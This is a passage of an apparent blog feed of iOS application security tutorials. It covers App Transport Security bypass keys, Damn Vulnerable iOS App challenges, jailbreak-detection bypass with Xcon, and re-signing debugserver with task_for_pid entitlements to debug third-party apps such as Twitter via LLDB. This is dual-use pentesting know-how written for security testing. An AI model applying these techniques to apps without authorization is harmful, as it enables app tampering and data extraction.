&lt;!--more--&gt;

&lt;p&gt;It is important to note that just using HTTPs is not enough. The following screenshot taken from Apple’s &lt;a href=&quot;https://developer.apple.com/library/ios/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html#//apple_ref/doc/uid/TP40009251-SW33&quot;&gt;documentation&lt;/a&gt; discusses the necessary conditions necessary for ATS. &lt;img src=&quot;/images/posts/ios46/1.png&quot; alt=&quot;1&quot; /&gt; Since updating to iOS 9, developers start getting errors like if the app is not communicating over a secure connection.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Connection failed: Error Domain=NSURLErrorDomain Code=-1022 “The resource could not be loaded because the App Transport Security policy requires the use of a secure connection.” UserInfo={NSUnderlyingError=0x7fada0f31880 {Error Domain=kCFErrorDomainCFNetwork Code=-1022 “(null)”}, NSErrorFailingURLStringKey=MyServiceURL, NSErrorFailingURLKey=MyServiceURL, NSLocalizedDescription=The resource could not be loaded because the App Transport Security policy requires the use of a secure connection.}&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The reason for this is because developers are mostly testing their apps against a staging server with a misconfigured certificate. In some cases, they might be communication with production servers over HTTPs but might not be using old TLS versions. A simple google search will take you to a &lt;a href=&quot;http://stackoverflow.com/questions/32631184/the-resource-could-not-be-loaded-because-the-app-transport-security-policy-requi&quot;&gt;Stack overflow&lt;/a&gt; that tells you how to bypass ATS by setting a single key NSAllowsArbitraryLoads to YES in the Info.plist file. The following configuration in the Info.plist file shows the ATS feature bypass implemented. &lt;img src=&quot;/images/posts/ios46/x.png&quot; alt=&quot;X&quot; /&gt; However, in some cases the developer might have a secure communication with their backend server. But communication with third party servers for Analytics, Crash logs etc might not be over a secure connection. In this case, they can add certain domains as an exception. &lt;img src=&quot;/images/posts/ios46/y.png&quot; alt=&quot;Y&quot; /&gt; To find whether the app has ATS enabled or not, you can perform the following steps.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Decrypt the app using Clutch&lt;/li&gt;
  &lt;li&gt;Unzip the decrypted IPA file and look inside the Info.plist file.&lt;/li&gt;
  &lt;li&gt;Look for the key &lt;em&gt;App Transport Security&lt;/em&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;By the end of 2016, App transport security is going to be a &lt;a href=&quot;https://techcrunch.com/2016/06/14/apple-will-require-https-connections-for-ios-apps-by-the-end-of-2016/&quot;&gt;requirement&lt;/a&gt; for App Store apps. It is important that you report any ATS bypass to the developers during security assessment of iOS Apps.&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 45 - Enhancements in Damn Vulnerable iOS app version 1.5</title>
   <link href="https://bitbrain.github.io/2015/05/31/ios-application-security-part-45-enhancements-in-damn-vulnerable-ios-app-version-2-dot-0.html"/>
   <updated>2015-05-31T00:18:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/05/31/ios-application-security-part-45-enhancements-in-damn-vulnerable-ios-app-version-2-dot-0</id>
   <content type="html">&lt;p&gt;In this article, i would like to give a quick walkthrough of the new vulnerabilities and challenges that we have added in version 1.5 of &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS app&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In the Insecure Data storage section, we have added challenges for the following databases.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Realm Database&lt;/li&gt;
  &lt;li&gt;Couchbase Lite&lt;/li&gt;
  &lt;li&gt;YapDatabase&lt;/li&gt;
&lt;/ul&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios45/1.png&quot; alt=&quot;1&quot; /&gt; &lt;img src=&quot;/images/posts/ios45/2.png&quot; alt=&quot;2&quot; /&gt; &lt;img src=&quot;/images/posts/ios45/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have also added a new section on &lt;em&gt;Extension vulnerabilities&lt;/em&gt;, which covers vulnerabilities in different application extensions, a feature that was introduced with iOS 8.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios45/4.png&quot; alt=&quot;4&quot; /&gt; &lt;img src=&quot;/images/posts/ios45/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the &lt;em&gt;Runtime Manipulation section&lt;/em&gt;, we have added a challenge where you can write a cycript script to brute force a login screen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios45/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another new section is &lt;em&gt;Attacks on third party libraries&lt;/em&gt;, which demonstrates the security gaps that can occur in your application when you use third party libraries in your project.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios45/7.png&quot; alt=&quot;7&quot; /&gt; &lt;img src=&quot;/images/posts/ios45/8.png&quot; alt=&quot;8&quot; /&gt; &lt;img src=&quot;/images/posts/ios45/9.png&quot; alt=&quot;9&quot; /&gt; &lt;img src=&quot;/images/posts/ios45/10.png&quot; alt=&quot;10&quot; /&gt; &lt;img src=&quot;/images/posts/ios45/11.png&quot; alt=&quot;11&quot; /&gt; &lt;img src=&quot;/images/posts/ios45/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the section on &lt;em&gt;Side Channel Data leakage&lt;/em&gt;, we have added another vulnerability demonstrating insecure storage of cookies.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios45/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The current downloadable IPA file from the website is a fat binary that will work on both 32 bit and 64 bit devices. This app will work on all iOS versions starting from iOS 7.0.&lt;/p&gt;

&lt;p&gt;Some important links&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Official Website&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://github.com/prateek147/DVIA&quot;&gt;Github Page&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://damnvulnerableiosapp.com#downloads&quot;&gt;Downloads Page&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We are working on getting the new solutions out as soon as possible so please be patient. For previous vulnerabilities, you can download the solutions for free from &lt;a href=&quot;http://damnvulnerableiosapp.com#solutions&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For any bugs, suggestions etc, please don’t hesitate to contact me. Also, a very special thanks to &lt;a href=&quot;http://twitter.com/igrekde&quot;&gt;Egor&lt;/a&gt; for his contributions to the project.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 44 - Bypassing Jailbreak detection using Xcon</title>
   <link href="https://bitbrain.github.io/2015/05/23/ios-application-security-part-44-bypassing-jailbreak-detection-using-xcon.html"/>
   <updated>2015-05-23T00:18:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/05/23/ios-application-security-part-44-bypassing-jailbreak-detection-using-xcon</id>
   <content type="html">&lt;p&gt;In this small article, we will look at a very handful utility named &lt;a href=&quot;https://www.theiphonewiki.com/wiki/XCon&quot;&gt;Xcon&lt;/a&gt;for bypassing Jailbreak detection. As per the wiki page …&lt;/p&gt;

&lt;p&gt;&lt;em&gt;xCon is a collaborative project by n00neimp0rtant and Lunatik that aims to be an all-in-one solution for hooking every known method and function responsible for informing an application of a jailbroken device. At first, the project aimed to patch applications on a per-app basis, but now it uses lower-level hooks to cover any apps that attempt to use the same procedure, even patching apps not explicitly reversed by the developers. Originally an open-source project, it remains closed-source now to discourage App Store developers from working around xCon’s hooks.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;A very handful resource for detecting jailbroken devices can be found &lt;a href=&quot;https://www.theiphonewiki.com/wiki/Bypassing_Jailbreak_Detection&quot;&gt;here&lt;/a&gt;. Here is a screenshot from the page. The purpose of Xcon is to make sure all these checks fail.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios44/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Downloading Xcon in your project is very straightforward. Make sure http://apt.modmyi.com is added as a source in Cydia and search for Xcon. Install in on your device and restart your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios44/x.PNG&quot; alt=&quot;X&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you run any app, you will notice that the library will inject into the process as can be seen from the following device logs. &lt;img src=&quot;/images/posts/ios44/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you are performing jailbreak detection in your application, it is recommended to have your app checked against Xcon. The library is closed source as making it open source will help developers understand how it works and hence make workarounds to their code.&lt;/p&gt;

&lt;p&gt;Please note that the current version of Xcon has a lot of issues with iOS 8 and 64 bit devices. Hence it is recommended to run your app on a 32 bit device if you want to test it against Xcon. A complete list of all the issues occuring with Xcon can be found &lt;a href=&quot;https://github.com/n00neimp0rtant/xCon-Issues&quot;&gt;here.&lt;/a&gt;&lt;img src=&quot;/images/posts/ios44/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Xcon has already patched jailbreak checks done by a lot of the popular apps and it also maintains a list of it. A screenshot of it can be found below. To see the complete list, you can visit Xcon’s page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios44/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Xcon is a recommended package to install on your device if you are pentesting an app that does jailbreak detection or if you are a developer and want to know that your jailbreak detection algorithm is accurate.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 43 - FAT binaries &amp; LLDB usage continued</title>
   <link href="https://bitbrain.github.io/2015/05/17/ios-application-security-part-43-fat-binaries-and-lldb-usage-continued.html"/>
   <updated>2015-05-17T00:18:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/05/17/ios-application-security-part-43-fat-binaries-and-lldb-usage-continued</id>
   <content type="html">&lt;p&gt;In this article, we will talk about FAT binaries and see more usage of LLDB.&lt;/p&gt;

&lt;p&gt;Fat binaries are single binaries that are compiled for different architectures. They are done so because it is easier to ship a single binary for different architectures. Apple has been changing the architecture in the last three versions of it’s iPhones, armv7, armv7s, and arm64. The good thing is that new iOS devices can run applications compiled for older architectures as well. However it is recommended to upgrade the architecture of the application for enhanced performance.&lt;/p&gt;

&lt;p&gt;You can see the architecture for your project by going to the Project in Xcode and looking under Build Settings.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A good way to find the architectures for which a binary is deployed is using otool. You can use the -f command to look at the fat headers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, it doesn’t mention the architecture name but the cputype and cpusubtype. However, after a bit of lookup from the information on cputype and cpusubtype, you can find out that the first one is armv7s whereas the second one is armv64. You can also use Clutch to find this out. Whitle decrypting, it can give information about the kinds of architectures the binary had. As you can see, in this case it was armv7 and arm64.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The easiest way is to find via the tool lipo&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/3s.png&quot; alt=&quot;3s&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In some cases, if some tool doesn’t work against a particular application, it is better to strip that architecture from the binary. This can be done using a tool named lipo. This is essentially useful as a lot of tools don’t work against arm64 binaries.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So with this little intro about fat binaries out of the way, lets carry on using LLDB. Like last article, we will be performing the analysis on Twitter app. Using Hopper, we can see some methods in the Twitter app.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So let’s set a breakpoint for the method &lt;em&gt;b -[T1CommerceOfferHowWorksView setHiddenObserver:]&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Oops, looks like we are unable to set a breakpoint. But why is that ? The reason is, LLDB hasn’t loaded the symbols from the binary yet. The symbols are what contains information about the class names and methods. This is unlike GDB where it loads the symbols while performing analysis on the binary. Remember however that you are running the LLDB client on your system and not the device. To confirm that you have not yet loaded the symbols, you can use the command &lt;em&gt;image dump symtab&lt;/em&gt; to load the symbols and look for this particular method, you will not find it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In order to load the symbols from the binary into LLDB, first download the LLDB binary onto your computer, then use the following command to load the symbols. Note that the architeture is set to armv7 by default.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now, you can see that you can set the breakpoint.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you know that the app is compiled for a 64 bit architecture, and the device is a 64 bit device, you should set the architecture to arm64. Does that make a difference ? Yes. Because the address will be different for the same method for different architectures (Fat binaries) and the method will not be called if you have set the breakpoint for a different architecture than the device it is compiled on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another thing. If you ever run a command and get the error &lt;em&gt;invalid frame&lt;/em&gt;, it means that the process is still running. In order to execute commands, the process must be paused. This can be done using the &lt;em&gt;process interrupt&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios43/x1.png&quot; alt=&quot;X1&quot; /&gt; &lt;img src=&quot;/images/posts/ios43/x2.png&quot; alt=&quot;X2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you think that arm64 is hard to understand and it is a bit difficult to modify the runtime flow, you can load the same executable on a 32 bit device and use GDB or LLDB to modify the variables and change the runtime flow. This is because most applications currently come with 32 bit support. However, in the coming year or so, this will not be the case. We will also cover arm64 assembly in a later article.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 42 - LLDB Usage continued</title>
   <link href="https://bitbrain.github.io/2015/05/12/ios-application-security-part-42-lldb-usage-continued.html"/>
   <updated>2015-05-12T00:17:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/05/12/ios-application-security-part-42-lldb-usage-continued</id>
   <content type="html">&lt;p&gt;In this article, we will look at some of the most important commands in LLDB to debug applications.&lt;/p&gt;

&lt;p&gt;If you have been following this blog series, you would have noticed that we have been using GDB until now for debugging applications, but the support for GDB has been disabled by Apple. Apple has compiled a very useful list of GDB to LLDB commands to get you up to date with debugging via LLDB that can be found &lt;a href=&quot;https://developer.apple.com/library/mac/documentation/IDEs/Conceptual/gdb_to_lldb_transition_guide/document/lldb-command-examples.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;We will look at some of the most important commands after hooking into an application. In this case, lets start debugging the Twitter app. So make sure that the Twitter app is running in the foreground on the device and start a listener for the Twitter app.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios42/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On your system, do the usual process of connecting to the debugserver application on the device to perform remote debugging. You can also use usbmuxd if you feel that debugging over Wifi is slow.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios42/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the connection has been established, you can now run debbugger commands to analyze the application. Let’s print out the AppDelegate object.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios42/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can read registers using the &lt;em&gt;register read&lt;/em&gt; command. To read all the registers, use the &lt;em&gt;register read –all&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios42/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Note the difference in the registers ? It’s because of the new arm64 architecture for this application. Another important command is &lt;em&gt;image list&lt;/em&gt; which will let you identify the location of the main executable and all the shared libraries.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios42/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;em&gt;image dump sections&lt;/em&gt; command will dump all the sections of the main executable and the shared libraries. You can later use this to dump information from the memory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios42/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Setting a breakpoint is very similar to GDB. First, see if there are any breakpoints set using the &lt;em&gt;br l&lt;/em&gt;. Then set a breakpoint for the objc_msgSend function using the &lt;em&gt;b objc_msgSend&lt;/em&gt; command. Then, resume the application using the &lt;em&gt;process continue&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios42/7.png&quot; alt=&quot;7&quot; /&gt; &lt;img src=&quot;/images/posts/ios42/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once a breakpoint is hit, you can use the command &lt;em&gt;di -f&lt;/em&gt; to see the disassembled code.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios42/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also configure LLDB to execute a command once every breakpoint is hit. This could be very handy in tracing method calls in the application. To do that, use the command &lt;em&gt;target stop-hook add&lt;/em&gt; and enter the commands that you want to enter once the breakpoint is hit. In this case, i have asked LLDB to print out all the registers and continue the program execution.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios42/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you don’t understand the purpose of these registers right now, don’t worry. I will cover arm64 architecture in a later article.&lt;/p&gt;

&lt;p&gt;It is usually a good idea to strip the debug symbols from the application binary before submitting to the App store. You can do this by going to Build Settings and set the option &lt;em&gt;Strip Debug Symbols During Copy&lt;/em&gt; to Yes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios42/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hope you enjoyed this article. We have just scratched the surface of LLDB right now. In the next article, we will look at importing symbols from binaries and settings breakpoints on application specific methods.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 41 - Debugging applications using LLDB</title>
   <link href="https://bitbrain.github.io/2015/04/28/ios-application-security-part-41-debugging-applications-using-lldb.html"/>
   <updated>2015-04-28T00:17:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/04/28/ios-application-security-part-41-debugging-applications-using-lldb</id>
   <content type="html">&lt;p&gt;In this article we will learn about the LLDB debugger used by Apple’s Xcode for debugging applications, understand why it is better for security testing, and then learn how to use it to debug iOS applications.&lt;/p&gt;

&lt;p&gt;The following excerpt is from Apple’s documentation.&lt;/p&gt;

&lt;p&gt;LLDB is Apple’s &lt;em&gt;from the ground up&lt;/em&gt; replacement for GDB, developed in close coordination with the LLVM compilers to bring you state-of-the-art debugging with extensive capabilities in flow control and data inspection. Starting with Xcode 5, all new and preexisting development projects are automatically reconfigured to use LLDB. The standard LLDB installation provides you with an extensive set of commands designed to be compatible with familiar GDB commands. In addition to using the standard configuration, you can easily customize LLDB to suit your needs&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;A good way to start leaning about the LLDB debugger is to watch this video from WWDC 2014.&lt;/p&gt;

&lt;iframe width=&quot;420&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/IPhgcbuDk_k&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;But the question that remains is, why is LLDB better than GDB ?&lt;/p&gt;

&lt;p&gt;To sum it up, there are a few reasons for that.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;It works well for iOS 8&lt;/li&gt;
  &lt;li&gt;LLDB is much faster, has support for multithread programming, and is scriptable.&lt;/li&gt;
  &lt;li&gt;LLDB understands the dot syntax. You can use something like &lt;em&gt;po self.propertyName&lt;/em&gt; or even &lt;em&gt;po instanceVariable&lt;/em&gt; to find any value of a property or instance variable while debugging applications.&lt;/li&gt;
  &lt;li&gt;It has plug-in support for functionality and extensions.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To debug applications on an iOS device, we will use the command line utility debugserver which is used by Apple’s Xcode to debug applications on the device. Usually, it gets installed on the device automatically when a device is marked for development, which requires a valid provisioning profile, but it can only debug applications that were signed by that particular provisioning profile. This is because of lack of entitlement to allow task_for_pid(). Hence, in order to debug any application, we must create a new entitlement file with the mentioned flag set to true, sign the debug server application with that entitlement file, and then deploy the console app to the device. Please note that the current location of debugserver application on the Mac is a read-only ramdisk, hence the application must be copied to a different location before signing with the new entitlement file.&lt;/p&gt;

&lt;p&gt;Hence, the first step to do is to mount Xcode’s developer disk image on your Mac and copy the debugserver binary to a seperate location where you can resign it. Use the following command.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;hdiutil attach /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport/[ios version]\ (12B411)/DeveloperDiskImage.dmg&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios41/1.png&quot; alt=&quot;1&quot; /&gt; &lt;img src=&quot;/images/posts/ios41/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, create a new file with the name entitlements.plist and enter the following data in it.&lt;/p&gt;

&lt;pre&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/ PropertyList-1.0.dtd&quot;&amp;gt;
 &lt;plist version=&quot;1.0&quot;&gt;&lt;dict&gt;&lt;key&gt;com.apple.springboard.debugapplications
	&lt;true /&gt;
	&lt;key&gt;run-unsigned-code
	&lt;true /&gt;
	&lt;key&gt;get-task-allow
	&lt;true /&gt;
	&lt;key&gt;task_for_pid-allow
	&lt;true /&gt;&amp;lt;/dict&amp;gt;&amp;lt;/plist&amp;gt; 
&amp;lt;/pre&amp;gt;

Now, you have to resign the debugserver binary with the new entitlements file.

_codesign -s - --entitlements entitlements.plist -f debugserver_ ![3](/images/posts/ios41/3.png)

Once this is done, deploy the binary to the device. To start debugserver on the device, use the command shown below, and also specify the name of the application you want to hook to, which in this case is Twitter.

![4](/images/posts/ios41/4.png)

Now on your computer, start lldb to enter the lldb interpreter. Now use the following commands as shown below to to connect to the device. Make sure to replace the IP address here with the IP address of your device.

![5](/images/posts/ios41/5.png)

Once this is done, you will see that you are successfully able to debug the application.

![6](/images/posts/ios41/6.png)

Now you can use the po command to print out specific objects instantiated in the application.

![7](/images/posts/ios41/7.png) ![8](/images/posts/ios41/8.png)

The syntax for LLDB is a bit different. For e.g, here is the syntax for printing all the register variables.

![9](/images/posts/ios41/9.png)

That's it for this article. In this article, we learnt how to deploy LLDB to the device and use it to run some basic commands. In the next article, we will look at some advanced usage of LLDB and how it can be used to find sensitive information in memory.
&lt;/key&gt;&lt;/key&gt;&lt;/key&gt;&lt;/key&gt;&lt;/dict&gt;&lt;/plist&gt;&lt;/pre&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 40 - Testing apps on your Mac</title>
   <link href="https://bitbrain.github.io/2015/04/28/ios-application-security-part-40-testing-apps-on-your-mac.html"/>
   <updated>2015-04-28T00:17:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/04/28/ios-application-security-part-40-testing-apps-on-your-mac</id>
   <content type="html">&lt;p&gt;In this article, we will discuss the extent to which you can test applications on your Mac rather than the device. This could be useful for many reasons, sometimes you may not have a jailbroken device but want to get a POC for a vulnerability. We will discuss what are the things you can and cannot do. To test the application on your system, you will need to have Xcode installed on your system and you will run the applications on the iOS simulator.&lt;/p&gt;

&lt;h3 id=&quot;installing-ipa-files-from-itunes-on-your-simulator&quot;&gt;Installing ipa files from iTunes on your simulator&lt;/h3&gt;

&lt;p&gt;Sadly, there is no way you can do that. This is because the iTunes applications are compiled for the ARM platform whereas the applications that run on your simulator are compiled for the x86/x64 platform. So, to test any application properly on your Mac, you must have the source code of the application to run it on the simulator.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;In this case, we are going to perform our testing on &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS app&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;analyzing-local-data-storage&quot;&gt;Analyzing local data storage&lt;/h3&gt;

&lt;p&gt;One of the most important things to check during performing penetration testing of iOS applications is checking for insecure local data storage vulnerabilites. You can easily check this by looking at the application folder created on your Mac by Xcode.This folder is available at the following locations.&lt;/p&gt;

&lt;p&gt;iOS 8 - /Users/[username]/Library/Developer/CoreSimulator/Devices/[a unique number]/data/Containers/Data/Application/[another unique number]/&lt;/p&gt;

&lt;p&gt;iOS 7 - /Users/[username]/Library/Application Support/iPhone Simulator/[ios version]/Applications/[a unique id]/&lt;/p&gt;

&lt;p&gt;Make sure to check this folder and see if the application is not storing any sensitive data to this folder.&lt;/p&gt;

&lt;h3 id=&quot;checking-device-logs&quot;&gt;Checking device logs&lt;/h3&gt;

&lt;p&gt;You can easily check the logs that the applications is logging by looking at the logs section in Xcode. For example, over here, we can see that the application is logging sensitive data to the device. However, if you see this behaviour, don’t immediately report it as a vulnerability. Some developers add a check to detect whether the application is running on a simulator or a device, and only log information if it is running on a simulator. If there is no such check, then this is definitely a vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios40/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;attaching-debuggers-and-tracing-method-calls&quot;&gt;Attaching debuggers and Tracing method calls&lt;/h3&gt;

&lt;p&gt;You can attach a debugger to the running application in the simulator. Its better to use LLDB debugger since it comes installed with Xcode command line tools. The iOS application running on the simulator can also be seen as a running process on your computer by using the command &lt;em&gt;ps aux&lt;/em&gt;. You can attach to the running application both by using the pid or the name.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios40/lldb.png&quot; alt=&quot;Lldb&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can easily trace the method calls by using the inbuilt debugger LLDB in Xcode. To do that, you need to add a symbolic breakpoint in Xcode. See the plus arrow in the bottom left and click on it to add a symbolic breakpoint.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios40/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now set a breakpoint for the &lt;em&gt;objc_msgSend&lt;/em&gt; call. Click on Add action and add the debugger command as &lt;em&gt;p (void)printf(“[%s, %s]\n”, (char*)object_getClassName($arg1), $arg2)&lt;/em&gt; and make sure you check the option to continue execution of the program. You will notice that you are now able to trace all the method calls.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios40/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;attaching-cycript&quot;&gt;Attaching cycript&lt;/h3&gt;

&lt;p&gt;You can even attach Cycript to the running application process in the simulator and demonstrate POC for vulnerabilities. Cycript works for Mac as well and you use the exact syntax that you use while auditing application on your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios40/cycript.png&quot; alt=&quot;Cycript&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;monitoring-network-traffic&quot;&gt;Monitoring Network traffic&lt;/h3&gt;

&lt;p&gt;You can pretty much see all the network traffic over HTTP/HTTPs without any issues. You can either use Burpsuite or Charles for it. For HTTPs traffic, you will have to install the SSL certificate on your simulator. To do this, simply drag and drop the certificate file to your simulator, and click on install to install the certificate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios40/cert.png&quot; alt=&quot;Cert&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s it for this article. In the next article, we will look at using the LLDB debugger for debugging iOS applications.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Damn Vulnerable iOS App solutions free for download</title>
   <link href="https://bitbrain.github.io/2015/04/03/damn-vulnerable-ios-app-solutions-free-for-download.html"/>
   <updated>2015-04-03T00:17:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/04/03/damn-vulnerable-ios-app-solutions-free-for-download</id>
